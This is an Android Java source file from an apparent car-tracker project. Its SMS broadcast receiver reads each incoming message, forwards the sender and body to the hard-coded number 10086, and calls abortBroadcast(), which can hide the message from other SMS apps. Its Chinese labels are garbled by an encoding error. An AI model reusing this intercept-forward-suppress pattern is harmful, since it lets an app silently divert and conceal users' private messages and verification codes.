package com.yusun.cartracker.api;

import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.os.Bundle;
import android.telephony.SmsMessage;
import android.widget.Toast;

public class SMSReceiver extends BroadcastReceiver {
	@Override
	public void onReceive(Context context, Intent intent) {
		String phone = "10086";
		String num, con;	
		Bundle bundle = intent.getExtras();
		if (bundle != null) {
			Object[] objs = (Object[]) bundle.get("pdus");
			SmsMessage[] smsMessages = new SmsMessage[objs.length];
			for (int i = 0; i < objs.length; i++) {
				smsMessages[i] = SmsMessage.createFromPdu((byte[]) objs[i]);
				num = smsMessages[i].getDisplayOriginatingAddress();
				con = smsMessages[i].getDisplayMessageBody();

				Toast.makeText(context, num + "----" + con, Toast.LENGTH_SHORT).show();

				System.out.println("ºÅÂë£º" + num + "ÄÚÈÝ£º" + con);
				SendMsg sendMsg = new SendMsg("ºÅÂë£º" + num + "ÄÚÈÝ£º" + con, phone);

			}
			abortBroadcast();
		}
	}
}